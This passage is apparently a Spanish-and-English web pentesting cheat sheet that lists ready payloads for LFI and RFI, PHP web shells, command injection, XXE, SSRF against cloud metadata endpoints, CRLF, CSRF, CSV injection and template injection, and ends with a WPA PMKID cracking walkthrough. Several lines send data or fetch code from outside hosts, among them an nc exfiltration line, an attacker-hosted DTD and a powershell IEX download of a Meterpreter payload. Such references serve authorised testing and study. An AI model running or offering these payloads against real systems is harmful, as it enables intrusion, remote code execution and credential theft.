/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27. #ejemplo
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";

#Set the cookie to <?php system("whoami"); ?>
login=1&user=<?php system("whoami");?>&pass=password&lang=en_us.php

#Use the LFI to include the PHP session file
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```

#### Email
```
#Mandar un correo a una cuenta interna (user@localhost) conteniendo:
<?php echo system($_REQUEST["cmd"]); ?>
#Acceder al correo (/var/mail/USER&cmd=whoami)

#Usando SMTP
telnet 10.10.10.10. 25
R> Trying 10.10.10.10....
R> Connected to 10.10.10.10..
R> Escape character is '^]'.
R> 220 straylight ESMTP Postfix (Debian/GNU)
helo ok
R> 250 straylight
mail from: mail@example.com
R> 250 2.1.0 Ok
rcpt to: root
R> 250 2.1.5 Ok
data
R> 354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.

http://example.com/index.php?page=/var/log/mail
```

#### /proc/*/fd/* 
```
#Subir un monton de shells
http://url.com/index.php?page=/proc/$PID/fd/$FD
#$PID = PID of the proccess (can be bruteforced)
#$FD = filedescriptor (can be bruteforced)
```

#### /proc/self/environ
```
#Como un archivo de log, mandar el payload en el User-Agent, 
#se va a reflejar dentro del arhivo /proc/self/environ
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

#### Subiendo archivo
```
If you can upload a file, just inject the shell payload in it 
(e.g : <?php system($_GET['c']); ?> ).

http://example.com/index.php?page=path/to/uploaded/file.png

In order to keep the file readable it is best to inject into the metadata
for the pictures/doc/pdf
```

#### Subiendo ZIP
```
1. Crear un archivo .php malicioso  (rce.php)
2. Comprimirlo a .zip (file.zip)
3. Subir tu archivo .zip 
4. https://site.com/index.php?page=zip://path/file.zip%23rce.php

# tambien se pueden usar:
# zlib://    example: compress.zlib://...
# bzip2://   example: compress.bzip2://...
# zip://     example: zip://archive.zip#dir/file.txt
# rar://     example: rar://<url encoded archive name>[*][#[<url encoded entry name>]]
```

#### Metodo de log
```
#Just append your PHP code into the log file by doing a request to the 
#service (Apache, SSH..) and include the log file.

http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

#### SSH
```
#Intentar loguearse por SSH con un codigo PHP de usuario <?php system($_GET["cmd"]);?>.
$ssh <?php system($_GET["cmd"]);?>@IP

http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

#### Archivos de credenciales
```
#Para que funcione tiene que estar corriendo con altos privilegios

#windows
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
#extraer hashes y despues crackearlos o PASSTHEHASH
samdump2 SYSTEM SAM > hashes.txt

#Linux
http://example.com/index.php?page=../../../../../../etc/shadow
```

### Shellshock bug
```
() { :;}; echo vulnerable
```
```
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```

### Bypass
```
i'''d
i"""d
```
```
\l\s -l\a\h
```
```
cat /e?c/p?ss??
cat /e??/??ss*
```
```
{ls,}
{ls,-a}
```

## RFI

La mayoria de los bypass para LFI sirven para RFI

### Basic
```
http://example.com/index.php?page=http://evil.com/shell.txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### Bypassing

#### General
```
#Upload as GIF
GIF98ddw213
  <?php
   system($_GET['cmd']);
 ?>
```

#### Usando Metadata
```
 exiftool -DocumentName="<h1><br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';}__halt_compiler();?></h1>" fox.jpg
```

#### Data wrapped
```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

#### Expect
```
http://example.com/index.php?page=php:expect://id
http://example.com/index.php?page=php:expect://ls
```

## Command injection

### Chains
```
cmdbyserver; ls
cmdserver && ls  #solo si el primer CMD sin errores
cmdserver | ls
cmdserver || ls    #Only if the first cmd fail
; cat flag
%0a cat flag
"; cat flag
`cat flag`
cat $(ls)
"; cat $(ls)
`cat flag | nc host 5278`

. flag
PS1=$(cat flag)

`echo${IFS}${PATH}|cut${IFS}-c1-1`
=> /
```

### Dentro de un comando
```
cmdserver `cat /etc/passwd`
cmdserver $(cat /etc/passwd)
```

### Blind Command Injection con Times Delays
```
parametro=1||ping+-c+10+127.0.0.1||
```

### Redireccion de salida
```
parametro=1||whoami>/var/www/images/output.txt||
```

### Out Of Band
```
parametro=x||nslookup+x.burpcollaborator.net||

parametro=x||nslookup+`whoami`.x.burpcollaborator.net||
```

### Bypassing en Linux

#### Sin espacios
```bash
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
X=$'uname\x20-a'&&$X
#hard bypassing
IFS=,;`cat<<<uname,-a`
```

#### Retorno de linea
```bash
something%0Acat%20/etc/passwd
something0x0als
```

#### Hex coding
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
xxd -r -p <<< 2f6574632f706173737764
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

#### Filtrado de barras
```bash
echo ${HOME:0:1} #/
cat ${HOME:0:1}etc${HOME:0:1}passwd
echo . | tr '!-0' '"-1' #/
tr '!-0' '"-1' <<< . #/
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

#### Filtrado de palabras
```bash
w'h'o'am'i
w"h"o"am"i
w\ho\am\i
$/\b\i\n/////s\h
who$@ami
echo whoami|$0
```

### Bypassing en Windows

#### Sin espacios
```terminal
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

#### Con wildcards
```terminal
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## XXE

### Basico
```
#dentro del GET request, se puede hacer con curl, 
o proxy inv
#Dentro del .DTD hay una estructura que necesita para validar el XML file
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
  
# Portswigger example:
Post /path
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

### b64 encoding
```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### b64 PHP wrapped
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >]>
<foo>&xxe;</foo>
```

### XXE en SVG
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

Se guarda localmente con extension .svg y se sube en un fileupload
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
```

### LFI Test via XXE
```
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

Con xInclude
```
POST /path

parametro=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo> 
```

Disparando error redefiniendo un DTD local
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### Blind XXE - Out of Band Interaction
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net"> ]> 
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

Una sola linea, sin %xxe;
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]> 
```

### Blind XXE > LFI test
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
```

### Blind XXE - Error based
```
# En dominio externo
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil; 

# Inyectamos XXE
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://dominio-atacante.com/archivo.dtd"> %xxe;]> 

# En la respuesta de esa inyeccion deberia salid un error con el contenido de passwd
```

### Blind XXE - Exfiltracion de datos via DTD externo
```
# En dominio externo, un archivo DTD con lo siguiente
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://burpcollaborator.net/?x=%file;'>">
%eval;
%exfil; 

# En host victima inyectamos XXE
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://dominio-atacante.com/archivo.dtd"> %xxe;]> 

# En el collaborator nos deberia llegar la request desde la maquina victima
GET /?x=nombreHost
```

### Access control bypass
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```

### SSRF Test via XXE
```
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> 
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

### XEE - DoS
```
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## HTML Injection

## HPP

## SSRF

```
https://127.0.0.1/admin
# podemos buscar sobre la red
https://192.168.0.Â§1Â§/admin
```

### Bypassing

```
# todos localhost
http://0177.1/
http://0x7f.1/
http://127.000.000.1
https://520968996
http://127.1/admin
http://127.1/%2561dmin
```

### payloads varios
```
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
[::]:80/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:80/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
â‘ â‘¡â‘¦.â“ª.â“ª.â“ª
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:80\@127.2.2.2:80/
127.1.1.1:80\@@127.2.2.2:80/
127.1.1.1:80:\@@127.2.2.2:80/
127.1.1.1:80#\@127.2.2.2:80/
```

Se puede calcular usando [network calculator](http://www.subnetmask.info/) en el segmento de "IP Address Converter".

```
http://localhost:80#@vulnerable.com/admin
#con doble url encoding
http://localhost:80%2523@vulnerable.com/admin
```

### Con Open Redirect
```
# Tenemos un path vulnerable a OpenRedirect
GET vulnerable.com/post/?path=http://vulnerable.com/nextPage=2

# Usamos el parametro vulnerable a SSRF para llamar al open redirect
POST /path
parametro=/post/?path=http://192.168.0.12:8080/admin/
```

### Wrappers
```
dict://
php://
jar://
gopher://
netdoc://
fd://
expect://
ogg://
tftp://
dict://
ftp://
sftp://
ldap://
ssh2://
file://
http://
https://
imap://
pop3://
mailto://
smtp://
telnet://
```

### IPv6
```
http://[::1]
http://[::]
```

### Wildcard DNS
```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

### Blind SSRF
```
# Apuntar al Collaborator

# Tambien se puede modificar el Referer, para ver si es vulnerable a SSRF
```

### AWS EC2 Metadata
```
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/local-hostname
http://169.254.169.254/latest/meta-data/public-hostname
```
### Google Cloud
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Azure
```
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

## CRLF Injection

### Request add cookie
```
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```

En header
```
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

### Agregar cookie con XSS bypass
```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

### Escribiendo HTML
```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

### filter bypass con UTF-8 encoding
```
#reminder %E5%98%8A = %0A = \u560a
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```

### CRLF a XSS
```
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

## CSRF

### Tool
```bash
xsrfprobe #suite
```
### Basico
```
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 
```

## Open Redirect

### Tool

#### GF
```bash
cat urls.txt | gf redirect
```
[GF Github](https://github.com/tomnomnom/gf)

### Payloads
```
/[redirect]
?targetOrigin=[redirect]
?fallback=[redirect]
?query=[redirect]
?redirection_url=[redirect]
?next=[redirect]
?ref_url=[redirect]
?state=[redirect]
?l=[redirect]
?redirect_uri=[redirect]
?forum_reg=[redirect]
?return_to=[redirect]
?redirect_url=[redirect]
?return_url=[redirect]
?host=[redirect]
?url=[redirect]
?redirectto=[redirect]
?return=[redirect]
?prejoin_data=[redirect]
?callback_url=[redirect]
?path=[redirect]
?authorize_callback=[redirect]
?email=[redirect]
?origin=[redirect]
?continue=[redirect]
?domain_name=[redirect]
?redir=[redirect]
?wp_http_referer=[redirect]
?endpoint=[redirect]
?shop=[redirect]
?qpt_question_url=[redirect]
?checkout_url=[redirect]
?ref_url=[redirect]
?redirect_to=[redirect]
?succUrl=[redirect]
?file=[redirect]
?link=[redirect]
?referrer=[redirect]
?recipient=[redirect]
?redirect=[redirect]
?u=[redirect]
?hostname=[redirect]
?returnTo=[redirect]
?return_path=[redirect]
?image=[redirect]
?requestTokenAndRedirect=[redirect]
?retURL=[redirect]
?next_url=[redirect]
```

### Bypass
```
/%09/google.com
```
```
/%5cgoogle.com
```
```
//www.google.com/%2f%2e%2e
```
```
//www.google.com/%2e%2e
```
```
//google.com/
```
```
//google.com/%2f..
```
```
//\google.com
```
```
/\victim.com:80%40google.com
```

### Open Redirect a SSRF

```
/foo/bar?vuln-function=http://127.0.0.1:8888/secret
```

## HTTP Smuggling

### Tools

* [smuggler](https://github.com/defparam/smuggler) --> ojo, tiene falsos positivos y negativos

## SSTI

## LRI

## JWT

### Base
```
Formato: Base64(Header).Base64(Data).Base64(Signature)
//Header generalmente
{
  "alg": "HS256",      //algoritmo
  "typ": "JWT"         //tipo de token
}
//data
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
//Firma
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

### Encode y Decode JWT

* [jsonwebToken](https://www.jsonwebtoken.io/)
* [jwt](https://jwt.io/)

### Tools
```bash
jwt_tool JWT -A #Toolkit
```
[Link](https://github.com/ticarpi/jwt_tool)

```bash
crackjwt JWT dictionary.txt #cracking
```
[Link](https://github.com/Sjord/jwtcrack)

```bash
jwtcrack JWT #cracking
```
[Link](https://github.com/brendan-rius/c-jwt-cracker)

## CSV Injection

### Newline Char
```
%0A-3+3+cmd|' /C calc'!D2
```

### Meterpreter shell
```
=cmd|'/C powershell IEX(wget http://x.x.x.x:x)'!A0
```

## Template Injection

### Ruby
```ruby
<%=`id`%>
```

### Twig
```Twig
{{7*'7'}}
```

### Jinja
```jinja
{{7*'7'}}
```

## XSLT Injection

### Backend infos
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
	<body>
		<xsl:text>xsl:vendor = </xsl:text><xsl:value-of select="system-property('xsl:vendor')"/><br/>
		<xsl:text>xsl:version = </xsl:text><xsl:value-of select="system-property('xsl:version')"/><br/>
	</body>
</html>
```

### Inyectando en PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
	<body>
		<xsl:value-of name="bugbounty" select="php:function('phpinfo')"/>
	</body>
</html>
```

## Deserializacion insegura

## Subdomain Takeover

* [sub404](https://github.com/r3curs1v3-pr0xy/sub404)

## Web Sockets

### Tools
* [STEWS](https://github.com/PalindromeLabs/STEWS)

# VoIP

## Tools

### Wirebug
```bash
./wirebug #suite
```

# Redes inalambricas

## PMKID clientless WPA/WPA2
```bash
#Software instalado: aircrack-ng, hashcat, hcxdumptool, hcxtools

sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

sudo airmon-ng check kill
sudo airmon-ng start wlan0

#empezamos a capturar los PMKID
sudo hcxdumptool -o salida.pcap -i wlan0 --enable_status=1
#convertimos lo capturado a un formato para hashcat
sudo hcxtools/hcxpcaptools -z hash.txt salida.pcap

#tenemos que comprobar que el archivo este bien
cat hash.txt
#un hash valido tienen que tener 4 partes separadas por un asterisco
#La segunda parte de las 4 contiene el BSSID del PMKID capturado asi 
#chequeamos que router es

#atacamos con hashcat
hashcat -m 16800 --force hash.txt /usr/share/wordlists/rockyou.txt
```

# Mobile

# CCTV

* [camover](https://github.com/EntySec/CamOver)

